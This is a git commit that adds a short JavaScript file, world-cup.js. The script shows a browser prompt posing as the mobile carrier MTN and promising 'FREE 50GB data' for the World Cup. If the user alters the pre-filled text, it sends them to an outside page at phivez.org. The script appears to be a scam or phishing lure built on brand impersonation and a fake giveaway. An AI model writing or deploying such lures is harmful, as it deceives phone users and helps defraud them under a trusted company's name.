aa0a75b9178ce97c818790b6ba9f8771f3cb3423
newblog13 <sweet16guyz@gmail.com>
2026-06-12 08:04:39 +0100

    Create world-cup.js

---
+++ world-cup.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('MTN: Dear Customer, Celebrate the World Cup with us! Enjoy FREE 50GB data and never miss a moment of the action., press OK to Activate 50GB ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://phivez.org/2026-world-cup.html';
+}
